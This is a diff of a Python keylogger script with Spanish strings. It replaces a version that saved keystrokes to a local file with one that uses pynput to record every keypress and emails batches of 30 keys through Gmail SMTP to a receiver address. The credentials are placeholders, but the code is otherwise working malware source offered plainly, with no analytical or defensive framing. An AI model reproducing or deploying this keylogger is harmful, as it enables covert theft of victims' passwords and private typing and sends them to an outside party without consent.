@@ -1,49 +1,55 @@
 
-from functools import partial
-import atexit
-import os
-import keyboard
-MAP = {
-    "space": " ",
-    "\r": "\n"
-}
+from pynput.keyboard import Key, Listener
+import logging
+import smtplib, ssl
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import time
 
-FILE_NAME = "keys.txt"
+captura = []
 
-CLEAR_ON_STARTUP = False
+def sendEmail(captura):
+	now = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
+	sender_email = "tu email"
+	receiver_email = "su email"
+	password = "password"
 
-TERMINATE_KEY = "esc"
-def callback(output, is_down, event):
-    if event.event_type in ("up", "down"):
-        key = MAP.get(event.name, event.name)
-        modifier = len(key) > 1
-        if not modifier and event.event_type == "down":
-            return
-        if modifier:
-            if event.event_type == "down":
-                if is_down.get(key, False):
-                    return
-                else:
-                    is_down[key] = True
-            elif event.event_type == "up":
-                is_down[key] = False
-            key = " [{} ({})] ".format(key, event.event_type)
-        elif key == "\r":
-            key = "\n"
-        output.write(key)
-        output.flush()
-def onexit(output):
-    output.close()
-def main():
-    if CLEAR_ON_STARTUP:
-        os.remove(FILE_NAME)
-    is_down = {}
+	message = MIMEMultipart("alternative")
+	message["Subject"] = "Nueva captura"
+	message["From"] = sender_email
+	message["To"] = receiver_email
 
-    output = open(FILE_NAME, "a")
+	text = ("Hora: " + str(now) + "\n  [+] Captura: " + captura)
 
-    atexit.register(onexit, output)
+	part = MIMEText(text, "plain")
 
-    keyboard.hook(partial(callback, output, is_down))
-    keyboard.wait(TERMINATE_KEY)
-if __name__ == "__main__":
-    main()
+	message.attach(part)
+
+	context = ssl.create_default_context()
+	with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
+		server.login(sender_email, password)
+		server.sendmail(
+			sender_email, receiver_email, message.as_string()
+		)
+ 
+logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format="%(message)s")
+ 
+def on_press(key):
+    logging.info(str(key))
+    
+    if(str(key) == "Key.space"): 
+        captura.append("   ")
+    else:
+        captura.append(str(key))
+
+    if(len(captura) == 30):
+
+        stringCapture = str(captura).replace("\"",'')
+        sendEmail(str(stringCapture))
+        print("[+]Captura enviada")
+        captura.clear()
+       
+
+with Listener(on_press=on_press) as listener :
+    listener.join()
+
